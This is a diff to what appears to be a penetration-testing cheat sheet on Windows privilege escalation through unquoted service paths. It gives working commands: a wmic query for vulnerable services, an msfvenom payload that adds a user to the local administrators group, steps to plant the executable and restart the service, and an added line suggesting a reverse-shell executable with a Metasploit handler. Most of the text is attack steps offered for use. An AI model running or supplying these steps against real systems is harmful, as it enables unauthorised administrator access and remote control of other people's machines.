@@ -109,6 +109,7 @@ wmic service get name,displayname,pathname,startmode |findstr /i "Auto" |findstr
 for example if path -- C:\Program Files\unquoted path\Common Files <br>
 Ensure you can stop and start service you are attacking -- sc query servicename <br>
 create exe - common.exe  -- msfvenom -p windows/exec CMD='net localgroup administrators user /add' -f exe-service -o common.exe <br>
+Or just make reverse shell exe and start multi/handler with same reverse shell on msfconsole <br>
 place in C:\Program Files\unquoted path (this ovbiously changes path for what you found) <br>
 call service   -- sc start servicename <br>
 you change change whats in the generated exe  <br>
